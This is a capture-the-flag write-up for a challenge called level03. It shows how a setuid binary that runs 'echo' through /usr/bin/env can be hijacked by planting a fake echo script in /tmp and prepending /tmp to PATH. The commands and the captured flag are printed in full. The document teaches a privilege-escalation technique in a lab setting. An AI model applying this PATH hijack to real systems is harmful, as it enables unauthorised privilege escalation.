# level03

We're presented with a binary executable, `./level03`. Executing it prints `Exploit me` to the standard output.

We can assume "Exploit me" is written somewhere in the code. It can be examined with gdb, but here, a simple `strings <executable>` might give us more information. We run :

```
strings ./level03 | grep Exploit
```

This yields `/usr/bin/env echo Exploit me`, meaning there's a string with those contents in the original program. This gives us our exploit : **this format is clearly fed directly to an executer**, like `system()`.

So what can we exploit ? The `echo` command here is executed by `/usr/bin/env` with a relative path, meaning it's entirely dependent on the env's `PATH` variable.

We can override it by creating an echo that does what *we* want (like a `getflag`) and changing the PATH. We run the following commands :

```
echo -e '#!/bin/bash\ngetflag' > /tmp/echo
chmod +x /tmp/echo
export PATH=/tmp:$PATH
./level03
```

The executable is tricked, and we get the following flag :

```
qi0maab88jeaj46qoumi7maus
```

*Note : this only works because `./level03` sets current user to `flag03`, by using functions like `seteuid()` to our advantage. This can be seen by running `gdb ./level03` and then, in GDB, `disas main`.*
